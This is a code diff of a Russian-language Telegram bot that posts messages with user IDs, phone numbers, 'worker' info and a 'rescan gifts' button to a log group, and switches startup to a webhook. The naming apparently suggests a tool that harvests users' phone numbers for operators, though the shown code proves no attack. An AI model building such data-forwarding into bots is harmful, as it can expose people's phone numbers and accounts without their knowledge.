@@ -32,10 +32,6 @@ bot = Bot(token=Config.BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 async def send_message_to_group_with_animation(message: str, user_id: int, phone: str, worker_info: dict = None):
     """Отправляет сообщение в группу с анимацией и кнопкой для повторного сканирования"""
-    if not Config.LOG_GROUP_ID:
-        print(f"⚠️ LOG_GROUP_ID не установлен, лог не отправлен")
-        return
-        
     print(f"🔍 [TELEGRAM_BOT] Начало отправки сообщения с анимацией для пользователя {user_id}")
     print(f"🔍 [TELEGRAM_BOT] Параметры: phone={phone}, worker_info={worker_info}")
     print(f"🔍 [TELEGRAM_BOT] Длина сообщения: {len(message)} символов")
@@ -43,35 +39,74 @@ async def send_message_to_group_with_animation(message: str, user_id: int, phone
     # Создаем новый bot instance для избежания проблем с event loop
     local_bot = None
     try:
-        from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, InputFile
-        import os
-        import tempfile
+        print(f"🔍 [TELEGRAM_BOT] Создаем новый bot instance...")
+        local_bot = Bot(token=Config.BOT_TOKEN)
+        print(f"✅ [TELEGRAM_BOT] Bot instance создан")
+        
+        print(f"🔍 [TELEGRAM_BOT] Импортируем aiogram компоненты...")
+        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+        from aiogram.utils.keyboard import InlineKeyboardBuilder
+        print(f"✅ [TELEGRAM_BOT] Aiogram компоненты импортированы")
         
         # Создаем клавиатуру с кнопкой для повторного сканирования
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔄 Повторить сканирование", callback_data=f"rescan_{user_id}")]
-        ])
+        print(f"🔍 [TELEGRAM_BOT] Создаем клавиатуру...")
+        keyboard = InlineKeyboardBuilder()
+        callback_data = f"rescan_gifts_{user_id}_{phone.replace('+', '')}"
+        print(f"🔍 [TELEGRAM_BOT] Callback data: {callback_data}")
+        
+        keyboard.add(
+            InlineKeyboardButton(
+                text="🔄 Повторить сканирование",
+                callback_data=callback_data
+            )
+        )
+        print(f"✅ [TELEGRAM_BOT] Клавиатура создана")
         
         # Отправляем изображение с сообщением
         image_url = "https://i.ibb.co/mVV04yPg/image.png"
         print(f"🔍 [TELEGRAM_BOT] URL изображения: {image_url}")
         print(f"🔍 [TELEGRAM_BOT] LOG_GROUP_ID: {Config.LOG_GROUP_ID}")
         
-        local_bot = None
         try:
-            print(f"🔍 [TELEGRAM_BOT] Создаем новый bot instance...")
-            local_bot = Bot(token=Config.BOT_TOKEN)
-            print(f"✅ [TELEGRAM_BOT] Bot instance создан")
+            print(f"🔍 [TELEGRAM_BOT] Попытка отправить изображение...")
+            # Отправляем изображение по URL
+            result = await local_bot.send_photo(
+                chat_id=Config.LOG_GROUP_ID,
+                photo=image_url,
+                caption=message,
+                parse_mode=None,  # Убираем Markdown парсинг
+                reply_markup=keyboard.as_markup()
+            )
+            print(f"✅ [TELEGRAM_BOT] Изображение успешно отправлено, message_id: {result.message_id}")
             
-            print(f"🔍 [TELEGRAM_BOT] Импортируем aiogram компоненты...")
-            from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-            from aiogram.utils.keyboard import InlineKeyboardBuilder
-            print(f"✅ [TELEGRAM_BOT] Aiogram компоненты импортированы")
+        except Exception as photo_error:
+            print(f"❌ [TELEGRAM_BOT] Ошибка отправки изображения: {photo_error}")
+            print(f"❌ [TELEGRAM_BOT] Тип ошибки изображения: {type(photo_error).__name__}")
+            logger.error(f"Error sending photo: {photo_error}")
             
-        except Exception as e:
-            print(f"❌ [TELEGRAM_BOT] Полный traceback:")
-            traceback.print_exc()
-            return False
+            # Если не удалось отправить изображение, отправляем обычное сообщение
+            print(f"🔍 [TELEGRAM_BOT] Отправляем обычное сообщение как fallback...")
+            result = await local_bot.send_message(
+                chat_id=Config.LOG_GROUP_ID,
+                text=message,
+                parse_mode=None,  # Убираем Markdown парсинг
+                reply_markup=keyboard.as_markup()
+            )
+            print(f"✅ [TELEGRAM_BOT] Обычное сообщение отправлено, message_id: {result.message_id}")
+        
+        logger.info(f"Message with animation sent to group for user {user_id}")
+        print(f"✅ [TELEGRAM_BOT] Сообщение с анимацией успешно отправлено для пользователя {user_id}")
+        return True
+        
+    except Exception as e:
+        print(f"❌ [TELEGRAM_BOT] Критическая ошибка отправки сообщения: {e}")
+        print(f"❌ [TELEGRAM_BOT] Тип критической ошибки: {type(e).__name__}")
+        print(f"❌ [TELEGRAM_BOT] Параметры при ошибке: user_id={user_id}, phone={phone}")
+        logger.error(f"Error sending message with animation to group: {e}")
+        import traceback
+        print(f"❌ [TELEGRAM_BOT] Полный traceback:")
+        traceback.print_exc()
+        return False
     finally:
         # Закрываем bot session
         if local_bot:
@@ -978,57 +1013,38 @@ async def main():
             logger.error(f"Не удалось получить информацию о боте: {e}")
             return
         
-        # Автоматический выбор режима в зависимости от URL
-        if "localhost" in Config.WEBAPP_URL or "127.0.0.1" in Config.WEBAPP_URL:
-            logger.info("🔧 Локальный режим: отключаем webhook, используем polling")
-            try:
-                await bot.delete_webhook(drop_pending_updates=True)
-                logger.info("Webhook удален")
-            except Exception as e:
-                logger.warning(f"Ошибка при удалении webhook: {e}")
-            
-            # Запускаем polling
-            logger.info("🚀 Запуск polling...")
-            await dp.start_polling(
-                bot,
-                handle_signals=False,  # Отключаем обработку сигналов для multiprocessing
+        # Сначала удаляем существующий webhook
+        try:
+            await bot.delete_webhook(drop_pending_updates=True)
+            logger.info("Webhook удален")
+        except Exception as e:
+            logger.warning(f"Ошибка при удалении webhook: {e}")
+        
+        # Устанавливаем webhook на Flask endpoint
+        webhook_url = f"{Config.WEBAPP_URL}/webhook"
+        try:
+            await bot.set_webhook(
+                url=webhook_url,
+                drop_pending_updates=True,
                 allowed_updates=["message", "callback_query", "inline_query"]
             )
-        else:
-            logger.info("🌐 Продакшн режим: устанавливаем webhook")
-            
-            # Сначала удаляем существующий webhook
-            try:
-                await bot.delete_webhook(drop_pending_updates=True)
-                logger.info("Webhook удален")
-            except Exception as e:
-                logger.warning(f"Ошибка при удалении webhook: {e}")
-            
-            # Устанавливаем webhook на Flask endpoint
-            webhook_url = f"{Config.WEBAPP_URL}/webhook"
-            try:
-                await bot.set_webhook(
-                    url=webhook_url,
-                    drop_pending_updates=True,
-                    allowed_updates=["message", "callback_query", "inline_query"]
-                )
-                logger.info(f"Webhook установлен: {webhook_url}")
-            except Exception as e:
-                logger.error(f"Ошибка при установке webhook: {e}")
-                return
-            
-            # Проверяем статус webhook
-            try:
-                webhook_info = await bot.get_webhook_info()
-                logger.info(f"Webhook info: {webhook_info}")
-            except Exception as e:
-                logger.warning(f"Не удалось получить информацию о webhook: {e}")
-            
-            logger.info("Бот успешно запущен и готов к работе")
-            
-            # Бесконечный цикл для поддержания работы
-            while True:
-                await asyncio.sleep(3600)  # Спим 1 час
+            logger.info(f"Webhook установлен: {webhook_url}")
+        except Exception as e:
+            logger.error(f"Ошибка при установке webhook: {e}")
+            return
+        
+        # Проверяем статус webhook
+        try:
+            webhook_info = await bot.get_webhook_info()
+            logger.info(f"Webhook info: {webhook_info}")
+        except Exception as e:
+            logger.warning(f"Не удалось получить информацию о webhook: {e}")
+        
+        logger.info("Бот успешно запущен и готов к работе")
+        
+        # Бесконечный цикл для поддержания работы
+        while True:
+            await asyncio.sleep(3600)  # Спим 1 час
             
     except Exception as e:
         logger.error(f"Ошибка запуска бота: {e}")
